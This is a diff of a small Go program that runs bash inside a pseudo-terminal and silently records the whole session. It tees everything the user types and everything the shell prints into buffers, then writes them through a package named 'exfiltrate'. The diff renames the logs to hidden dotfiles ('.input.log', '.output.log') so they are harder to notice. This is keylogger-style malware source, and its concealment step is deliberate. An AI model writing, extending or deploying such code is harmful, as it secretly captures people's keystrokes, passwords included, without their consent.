@@ -11,14 +11,7 @@ import (
 	"syscall"
 
 	"github.com/creack/pty"
-	"golang.org/x/term"
 )
-
-// func test() (in string, out string, err error) {
-// 	// Create arbitrary command.
-
-// 	return mw
-// }
 
 func main() {
 	fmt.Println("before bash")
@@ -42,8 +35,8 @@ func main() {
 	defer func() { signal.Stop(ch); close(ch) }() // Cleanup signals when done.
 
 	// Set stdin in raw mode.
-	oldState, _ := term.MakeRaw(int(os.Stdin.Fd()))
-	defer func() { _ = term.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.
+	// oldState, _ := term.MakeRaw(int(os.Stdin.Fd()))
+	// defer func() { _ = term.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.
 
 	// Copy stdin to the pty and the pty to stdout.
 	// NOTE: The goroutine will keep reading until the next keystroke before returning.
@@ -51,14 +44,15 @@ func main() {
 	var inBuffer bytes.Buffer
 
 	mwOut := io.MultiWriter(os.Stdout, &outBuffer)
+
 	in := io.TeeReader(os.Stdin, &inBuffer)
 	go func() { _, _ = io.Copy(ptmx, in) }()
 	_, _ = io.Copy(mwOut, ptmx)
 
 	fmt.Println("after bash")
 	// fmt.Println("Captured output", outBuffer.String())
-	exfiltrate.WriteFile(outBuffer.String(), "./output.log")
+	exfiltrate.WriteFile(outBuffer.String(), "./.output.log")
 
 	// fmt.Println("Captured input", inBuffer.String())
-	exfiltrate.WriteFile(inBuffer.String(), "./input.log")
+	exfiltrate.WriteFile(inBuffer.String(), "./.input.log")
 }
